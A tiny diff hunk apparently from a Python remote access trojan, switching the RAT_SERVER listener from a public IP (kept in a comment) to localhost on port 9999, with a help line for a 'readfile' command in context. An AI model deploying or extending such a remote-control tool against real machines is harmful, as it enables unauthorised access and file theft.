@@ -480,7 +480,7 @@ readfile <file>           read from file
                 rat.execute()
 
 
-rat = RAT_SERVER('50.116.8.102', 9999)
+rat = RAT_SERVER('127.0.0.1', 9999)
 
 # 50.116.8.102
 
